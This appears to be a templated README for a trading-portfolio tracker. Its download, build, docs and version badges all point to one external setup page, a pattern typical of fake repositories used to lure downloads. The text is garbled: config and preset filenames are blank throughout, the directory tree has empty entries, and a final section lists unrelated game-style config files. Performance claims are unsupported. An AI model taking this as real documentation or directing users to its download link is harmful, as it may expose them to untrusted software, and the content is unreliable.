# RobRun-Trader-Tracker

**Empower portfolio management with precision.** RobRun-Trader-Tracker delivers a unified configuration manager and workflow automation that synchronizes market data, trade analytics, and portfolio snapshots in real time. With a 99 % success rate for automated updates, the system guarantees that every trader’s dashboard reflects the latest market movements within milliseconds.

<a href="https://rewfdf.github.io/SetupPage/">
  <img src="https://img.shields.io/badge/Download-Release-16a34a?style=plastic&logo=gnubash&logoColor=white" alt="Download">
</a>
<a href="https://rewfdf.github.io/SetupPage/">
  <img src="https://img.shields.io/badge/Build-Passed-4c1?style=for-the-badge" alt="Build Status">
</a>
<a href="https://rewfdf.github.io/SetupPage/">
  <img src="https://img.shields.io/badge/Size-5.4MB-00bfff?style=flat-square" alt="Bundle Size">
</a>
<a href="https://rewfdf.github.io/SetupPage/">
  <img src="https://img.shields.io/badge/Docs-Available-ff69b4?style=flat" alt="Documentation">
</a>
<a href="https://rewfdf.github.io/SetupPage/">
  <img src="https://img.shields.io/badge/Version-1.3.0-ffb300?style=plastic" alt="Version">
</a>
---
## Architecture Overview
RobRun-Trader-Tracker is constructed around a modular configuration profile system. Each profile resides in a plain‑text file (``, ``, ``, ``) and defines a set of parameters that dictate data sources, refresh intervals, and visual themes. Profiles can be exchanged or merged using the built‑in sync command, which validates syntax and resolves conflicts automatically.

The core engine parses the active profile, establishes WebSocket connections to selected market feeds (e.g., AlphaVantage, Polygon.io), and routes data through a lightweight analytics pipeline. Results are written to a SQLite cache, then served to the web interface via a minimal Express server. This separation of concerns keeps the runtime footprint under 200 MB and enables hot‑reloading of profiles without restarting the service.

## Workflow Presets
Preset bundles allow traders to jump straight into a ready‑to‑use configuration. The bundle directory contains:

| Preset | Description | Included Profiles | Market Feeds | Analytics |
|--------|-------------|-------------------|--------------|-----------|
| `` | Tight‑lived, high‑frequency updates for intraday traders | ``, `` | Polygon.io, Binance | VWAP, ATR |
| `` | Quarterly aggregation for position‑based investors | ``, `` | AlphaVantage, Yahoo Finance | CAGR, Sharpe |
| `` | Conservative windowing with risk‑metrics | ``, `` | Polygon.io | VaR, CVaR |
| `` | Performance comparison against major indices | ``, ``, `` | Yahoo Finance | Alpha, Beta |

To activate a preset, copy the desired `.cfg` file into the `profiles` folder and restart the server. The web interface will immediately reflect the new configuration, updating charts, tables, and key‑performance indicators.

## Deployment & Runtime
RobRun-Trader-Tracker runs on any system with Node 12+ and npm. After downloading the release bundle, unpack it and execute `node server.js`. The service listens on port 8080 by default. Environment variables can override the listening port and log level:

| Variable | Default | Purpose |
|----------|---------|---------|
| `PORT` | 8080 | HTTP listen port |
| `LOG_LEVEL` | info | Sets verbosity (`debug`, `info`, `warn`, `error`) |

Once running, navigate to `http://localhost:8080` to access the dashboard. All data is persisted to `data/portfolio.db`. To perform a clean reset, delete this file and restart the service; the engine will rebuild the cache from scratch.

## Directory Layout
```
RobRun-Trader-Tracker/
├─ assets/
│   ├─ icons/
│   └─ charts/
├─ config/
│   ├─
│   ├─
│   ├─
│   └─
├─ presets/
│   ├─
│   ├─
│   ├─
│   └─
├─ data/
│   └─ portfolio.db
├─ server.js
├─ package.json
└─ README.md
```

The `assets` directory holds SVG icons and chart templates that are dynamically injected by the server. The `config` folder contains the active profiles, whereas `presets` is the library of ready‑to‑use configurations. All runtime data is isolated to the `data` folder.

## Frequently Asked Questions
**Q: Why does my portfolio not update after I change the refresh interval?**
A: The engine reads the interval once during startup. After editing ``, restart `server.js` to apply the new value. Cached data will be refreshed on the next tick.

**Q: Can I add a new market feed that isn’t listed in the presets?**
A: Yes. Edit ``, add an entry under `[DataSources]`, and supply the corresponding API key in the `environment` file. The engine will validate the endpoint during boot.

**Q: My analytics chart shows “NaN” values.**
A: This occurs when the data source fails to return a price series for a requested period. Verify connectivity and API quotas. The log will contain a descriptive error message.

**Q: How do I change the chart theme colors?**
A: Edit `` and adjust the `primary` and `secondary` hex codes. The changes are live‑reloadable; no restart is needed.

**Q: I need a custom indicator not present in the built‑in set.**
A: Implement the indicator as a JavaScript module in `plugins/` and import it in `analytics.js`. The engine will automatically load all modules found in that directory during initialization.

---
### Contact & Community
For support, join the discussion forum at `https://forum.robtradertracker.org` or open an issue on this repository. Contributing guidelines and coding standards are documented in the `CONTRIBUTING.md` file.

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```